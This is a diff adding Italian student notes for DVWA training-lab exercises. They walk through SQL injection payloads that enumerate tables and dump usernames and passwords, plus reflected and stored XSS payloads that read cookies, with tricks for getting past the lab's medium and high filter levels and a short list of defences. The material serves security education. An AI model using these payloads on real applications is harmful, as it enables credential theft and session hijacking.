@@ -1,0 +1,54 @@
+1) 1' or 1=1#
+questo stato è sempre vero quindi ritorna tutta la tabella   
+
+2) L’operatore UNION unisce l’output di più query SQL “omogenee”
+
+1’ UNION select 1, table_name!!FROM information_schema.tables!!WHERE table_schema = ‘dvwa’#!
+
+andiamo a estrarre dalla tabella information_schema.tables dove table_schema è dvwa
+Otteniamo le due tabelle guestbook e  users
+
+1’ UNION select 1, user()#
+
+L’utente SQL usato dall’applicazione  DVWA è root. Il database è ospitato sullo stesso host dall’applicazione 
+
+
+3)
+1' union select 1, password from users #
+trovo così tutte le password degli account dalla tabella users
+
+
+
+4) 
+ 1' union select 1, concat(user_id,  ' : ' , first_name,  ' : ' , last_name,  user, ' : ',  password) from users #
+ 
+uso concat vado a concatenare le varie stringhe dalla tabella users
+
+5)Per risolvere il problema dell'injection possiamo:
+-  Per risolvere SQL injection si usano dei moduli nei firewall a livello applicazione, che analizzano i dati di input, vengono sanificati e passati alle applicazioni.
+-Possiamo implementare un filtro dei caratteri speciali SQL.
+-Attivando la script security a livello “high”, che annulla il significato semantico dell’operatore OR, che viene visto come una semplice stringa
+
+6)
+Analizzando il codice sorgente si può notare come non ci sia alcun controllo in input sulla variabile $_GET[‘name’], quindi con security low possiamo usare script
+
+<script>alert(document.cookie)</script>
+
+7)
+no con medium e high non è più possibile usare <script>alert(document.cookie)</script> 
+
+con il livello medium viene filtrata dalla stringa <script>
+con medium <img src=”#” onclick=alert(document.cookie) >
+non è possibile filtrare questo elemento
+
+no con high non è possibile, tutto JavaScript verrà bloccato perché il codice rimuoverà il modello "<s * c * r * i * p * t". Dato che non possiamo iniettare alcun codice che inizia con il tag <script>, possiamo usare eventi HTML per l'iniezione di codice poiché non ci sarà alcun tag <script> incluso. 
+
+8)
+mettendo nel campo message <script>alert(document.cookie)</script>
+Poiché si tratta di un attacco XSS memorizzato, questo sarà persistente fino alla cancellazione del Guestbook. ogni volta che un utente visita questa scheda, il suo ID di sessione verrà visualizzato in un avviso
+
+9) Con medium non funziona più.
+Usiamo il tag body per iniettare la stringa. evito di mettere script
+<body onload=alert("XSS")>
+
+
